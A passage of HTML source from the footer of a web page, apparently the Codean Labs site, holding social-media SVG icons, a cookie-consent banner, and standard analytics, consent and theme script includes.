4.318 11.5351 5.316L12.1731 6.376L12.8111 5.316C13.4711 4.317 14.4611 3.818 15.7711 3.818C16.9011 3.818 17.8141 4.213 18.5111 4.982C19.1861 5.752 19.5231 6.792 19.5231 8.102L19.5201 14.508Z"/>
</g>

</svg>
                </a>
                                <a href="https://discord.gg/nVDwK8fbH7" target="_blank" class="icon:hover:scale-125 icon:fill-content-neutral/70 icon:hover:fill-content-neutral icon:transition-all icon:duration-300" aria-label="Discord" rel="me">
                    <svg width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
<g>
<path d="M20.317 4.36985C18.761 3.65561 17.119 3.1463 15.4319 2.85465C15.4166 2.85179 15.4007 2.85384 15.3867 2.8605C15.3726 2.86716 15.3609 2.8781 15.3534 2.89175C15.1424 3.26705 14.9087 3.75655 14.7451 4.14125C12.9004 3.86505 11.0651 3.86505 9.2583 4.14125C9.0947 3.74795 8.8525 3.26705 8.6406 2.89175C8.63276 2.87841 8.62107 2.86774 8.60706 2.86114C8.59306 2.85454 8.57739 2.85231 8.5621 2.85475C6.87488 3.14572 5.2327 3.65499 3.6769 4.36975C3.66359 4.37544 3.65238 4.38512 3.6448 4.39745C0.533404 9.04585 -0.318996 13.58 0.099204 18.0579C0.100386 18.0688 0.103757 18.0794 0.109116 18.0891C0.114476 18.0987 0.121714 18.1072 0.130404 18.1139C2.1832 19.6215 4.1717 20.5368 6.1233 21.1434C6.13848 21.1479 6.15468 21.1477 6.16972 21.1427C6.18477 21.1378 6.19795 21.1284 6.2075 21.1158C6.6691 20.4854 7.0806 19.8206 7.4335 19.1216C7.43835 19.112 7.44112 19.1015 7.44163 19.0908C7.44213 19.0801 7.44036 19.0693 7.43643 19.0594C7.4325 19.0494 7.4265 19.0403 7.41883 19.0328C7.41115 19.0253 7.40198 19.0196 7.3919 19.0159C6.7391 18.7683 6.1176 18.4664 5.5197 18.1236C5.5088 18.1171 5.49964 18.1082 5.49304 18.0974C5.48643 18.0866 5.48258 18.0744 5.48183 18.0617C5.48108 18.0491 5.48345 18.0365 5.48873 18.025C5.49401 18.0135 5.50204 18.0035 5.5121 17.9959C5.6379 17.9016 5.7638 17.8035 5.8839 17.7044C5.89458 17.6956 5.9075 17.69 5.92121 17.6881C5.93492 17.6863 5.94887 17.6883 5.9615 17.6939C9.8893 19.4872 14.1415 19.4872 18.0229 17.6939C18.0355 17.6879 18.0496 17.6856 18.0635 17.6873C18.0774 17.689 18.0906 17.6946 18.1014 17.7035C18.2216 17.8025 18.3474 17.9016 18.4742 17.9959C18.4843 18.0034 18.4924 18.0134 18.4977 18.0248C18.5031 18.0362 18.5055 18.0488 18.5049 18.0614C18.5042 18.074 18.5005 18.0863 18.494 18.0971C18.4875 18.1079 18.4784 18.117 18.4676 18.1235C17.8695 18.4728 17.2429 18.771 16.5946 19.0149C16.5845 19.0187 16.5754 19.0246 16.5678 19.0323C16.5602 19.0399 16.5542 19.049 16.5504 19.0591C16.5466 19.0692 16.5449 19.0799 16.5455 19.0907C16.5461 19.1015 16.549 19.112 16.5539 19.1216C16.9143 19.8196 17.3258 20.4844 17.7789 21.1148C17.7882 21.1278 17.8013 21.1375 17.8164 21.1427C17.8315 21.1478 17.8478 21.148 17.8631 21.1434C19.8241 20.5366 21.8126 19.6215 23.8654 18.1139C23.8742 18.1075 23.8816 18.0992 23.887 18.0897C23.8924 18.0802 23.8957 18.0696 23.8967 18.0588C24.3971 12.8818 23.0585 8.38485 20.3482 4.39835C20.3416 4.3854 20.3305 4.37535 20.317 4.36985ZM8.02 15.3313C6.8375 15.3313 5.8631 14.2456 5.8631 12.9123C5.8631 11.5791 6.8186 10.4934 8.0201 10.4934C9.2309 10.4934 10.1958 11.5886 10.1769 12.9124C10.1769 14.2456 9.2214 15.3313 8.02 15.3313ZM15.9948 15.3313C14.8123 15.3313 13.8379 14.2456 13.8379 12.9123C13.8379 11.5791 14.7933 10.4934 15.9948 10.4934C17.2056 10.4934 18.1705 11.5886 18.1516 12.9124C18.1516 14.2456 17.2056 15.3313 15.9948 15.3313Z" />
</g>
</svg>
                </a>
                        </ul>
    </div>
    </div>
    </footer>
    <template x-data x-if="$store.cookieBanner.set === false">
    <div class="bg-surface-page fixed bottom-0 w-screen">
        <div class="container py-4 lg:py-10 flex flex-col lg:flex-row gap-6 lg:gap-10 items-center">
            <div class="space-y-2">
                <h3 class="text-lg lg:text-2xl">Codean uses cookies</h3>
                <p class="text-sm lg:text-base text-content-neutral/70">
                        We use cookies to enhance your browsing experience and analyze site traffic.
                        By continuing to use this website, you consent to our <a href="" target="_blank">privacy statement</a>
                </p>
            </div>
            <div class="flex w-full lg:w-fit gap-4">
                <a @click="$store.cookieBanner.accept()" class="btn btn--primary">Accept</a>
                <a @click="$store.cookieBanner.decline()" class="btn btn--blank">Decline</a>
            </div>
        </div>
    </div>
</template>
		<!-- Google Tag Manager (noscript) snippet added by Site Kit -->
		<noscript>
			<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TJNDGM5W" height="0" width="0" style="display:none;visibility:hidden"></iframe>
		</noscript>
		<!-- End Google Tag Manager (noscript) snippet added by Site Kit -->
		<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="module" src="https://codeanlabs.com/wp-content/themes/codean/dist/main-BGM9hfub.js?ver=6.7.1" id="main.ts-js"></script>
<script type="text/javascript" src="https://codeanlabs.com/wp-content/plugins/google-site-kit/dist/assets/js/googlesitekit-consent-mode-3d6495dceaebc28bcca3.js" id="googlesitekit-consent-mode-js"></script>
<script type="text/javascript" id="wp-consent-api-js-extra">
/* <![CDATA[ */
var consent_api = {"consent_type":"optin","waitfor_consent_hook":"","cookie_expiration":"30","cookie_prefix":"wp_consent"};
/* ]]> */
</script>
<script type="text/javascript" src="https://codeanlabs.com/wp-content/plugins/wp-consent-api/assets/js/wp-consent-api.min.js?ver=1.0.8" id="wp-consent-api-js"></script>
<script type="module" src="https://codeanlabs.com/wp-content/themes/codean/dist/highlightjs-_cMGS40y.js?ver=6.7.1" id="src/highlightjs.ts-js" defer="defer" data-wp-strategy="defer"></script>
</body>
</html>
